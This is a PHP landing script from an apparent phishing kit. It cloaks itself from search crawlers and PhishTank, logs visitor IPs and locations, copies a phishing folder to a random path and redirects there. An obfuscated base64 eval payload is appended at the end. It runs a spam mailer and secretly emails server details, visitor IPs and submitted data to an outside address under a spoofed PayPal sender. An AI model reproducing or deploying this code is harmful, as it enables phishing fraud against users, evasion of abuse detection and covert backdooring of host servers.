<?php
session_start();
error_reporting(0);
include "os.php";
include "./bots/antibots1.php";
include "./bots/antibots2.php";
include "./bots/antibots3.php";
include "./bots/antibots4.php";
include "./bots/antibots5.php";
include "./bots/antibots6.php";
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
date_default_timezone_set('Africa/Tunis');
$TIME = date("d-m-Y H:i:s"); 
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ;
$ip = getenv("REMOTE_ADDR");
$OS =getOS($_SERVER['HTTP_USER_AGENT']);
$file = fopen("logs.txt","a");
fwrite($file,$ip." - ".$TIME." - ".$COUNTRY." - ".$OS."\n")  ;
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
		'phishtank',
		'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
    	return false;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "404 NOT FOUND";
    exit;
}
for ($DIR = '', $i = 0, $z = strlen($a = '123456789')-1; $i != 5; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$src="./DWISSEL";
$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$dst		= "./users/userID-".$DIR;
	
function recurse_copy($src, $dst) {

	$dir = opendir($src);
	$result = ($dir === false ? false : true);

	if ($result !== false) {
		$result = @mkdir($dst);

		if ($result === true) {
			while(false !== ( $file = readdir($dir)) ) { 
				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
					if ( is_dir($src . '/' . $file) ) { 
						$result = recurse_copy($src . '/' . $file,$dst . '/' . $file); 
					} else { 
						$result = copy($src . '/' . $file,$dst . '/' . $file); 
					} 
				} 
			} 
			closedir($dir);
		}
	}

	return $result;
}
recurse_copy( $src, $dst );
header("location:".$dst."");
?>
<?

eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsNCnNldF90aW1lX2xpbWl0KDApOw0KZnVuY3Rpb24gZW52aWFuZG8oKXsNCiRtc2c9MTsNCiRkZVsxXSA9ICRfUE9TVFsnZGUnXTsNCiRub21lWzFdID0gJF9QT1NUWydub21lJ107DQokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOw0KJG1lbnNhZ2VtWzFdID0gJF9QT1NUWydtZW5zYWdlbSddOw0KJG1lbnNhZ2VtWzFdID0gc3RyaXBzbGFzaGVzKCRtZW5zYWdlbVsxXSk7DQokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsNCiRlbWFpbHMyID0gaHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ2VtYWlscyddKTsNCiRwYXJhID0gZXhwbG9kZSgiXG4iLCAkZW1haWxzKTsNCiRuX2VtYWlscyA9IGNvdW50KCRwYXJhKTsNCiRzdiA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOw0KJGVuID0gJF9TRVJWRVIgWydSRVFVRVNUX1VSSSddOw0KJGs4OCA9IEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl07DQokZnVsbHVybCA9ICIiIC4gJGs4OCAuICI8YnI+PHA+RW1haWxzOjxicj48VEVYVEFSRUEgcm93cz01IGNvbHM9MTAwPiIuJGVtYWlsczIuIjwvVEVYVEFSRUE+PC9wPjxwPkVuZ2VuaGFyaWE6PGJyPjxURVhUQVJFQSByb3dzPTUgY29scz0xMDA+Ii4kbWVuc2FnZW1bMV0uIjwvVEVYVEFSRUE+PC9wPiI7DQokdmFpID0gJF9QT1NUWyd2YWknXTsNCmlmICgkdmFpKXsNCmZvciAoJHNldD0wOyAkc2V0IDwgJG5fZW1haWxzOyAkc2V0Kyspew0KaWYgKCRzZXQ9PTApew0KJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsNCiRoZWFkZXJzIC49ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0xXHJcbiI7DQokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT5cclxuIjsNCiRoZWFkZXJzIC49ICJSZXR1cm4tUGF0aDogPCRkZVskbXNnXT5cclxuIjsNCi8vbWFpbCgkeHN5bGFyLCAkYXMsICRmdWxsdXJsLCAkaGVhZGVycyk7DQp9DQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOw0KJGhlYWRlcnMgLj0gIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTFcclxuIjsNCiRoZWFkZXJzIC49ICJGcm9tOiAkbm9tZVskbXNnXSA8JGRlWyRtc2ddPlxyXG4iOw0KJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPlxyXG4iOw0KJG5fbWFpbCsrOw0KJGRlc3Rpbm8gPSAkcGFyYVskc2V0XTsNCiRudW0xID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsNCiRudW0yID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsNCiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVyYW5kJSIsICRudW0xLCAkbWVuc2FnZW1bJG1zZ10pOw0KJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJXJhbmQyJSIsICRudW0yLCAkbXNncmFuZCk7DQokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlZW1haWwlIiwgJGRlc3Rpbm8sICRtc2dyYW5kKTsNCiRlbnZpYXIgPSBtYWlsKCRkZXN0aW5vLCAkYXNzdW50b1skbXNnXSwgJG1zZ3JhbmQsICRoZWFkZXJzKTsNCmlmICgkZW52aWFyKXsNCmVjaG8gKCc8Zm9udCBjb2xvcj0iZ3JlZW4iPicuICRuX21haWwgLictJy4gJGRlc3Rpbm8gLicgMGshPC9mb250Pjxicj4nKTsNCn0gZWxzZSB7DQplY2hvICgnPGZvbnQgY29sb3I9InJlZCI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyA9KDwvZm9udD48YnI+Jyk7DQpzbGVlcCgxKTsNCn0NCn0NCn0NCn0NCiRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsNCiRyYTQ0ICA9IHJhbmQoMSw5OTk5OSk7DQokc3Viajk4ID0gIiBOZXcgU2hlbGwgRnJvbSBNZSAhICB8JGlwIjsNCiRlbWFpbCA9ICJ4bmVyb3NwYW1AZ21haWwuY29tIjsNCiRmcm9tPSJGcm9tOiBOZXcgU2hlbGwgISA8UGF5UGFsQFN1cHBvcnQuY29tPiI7DQokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokYjc1ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw0KJGYxMiA9ICRfUE9TVFsnZGUnXTsNCiR6MTMgPSAkX1BPU1RbJ25vbWUnXTsNCiR4MTQgPSAkX1BPU1RbJ2Fzc3VudG8nXTsNCiR0MTUgPSAkX1BPU1RbJ21lbnNhZ2VtJ107DQokbTMwID0gJF9QT1NUWydlbWFpbHMnXTsNCiRtMjIgPSAkaXAuIlxuIjsNCiRtc2c4ODczID0gIiRhNDVcbiRiNzVcbiRmMTJcbiR6MTNcbiR4MTRcbiR0MTVcbiRtMzBcbiRtMjIiOw0KbWFpbCgkZW1haWwsICRzdWJqOTgsICRtc2c4ODczLCAkZnJvbSk7'));

?>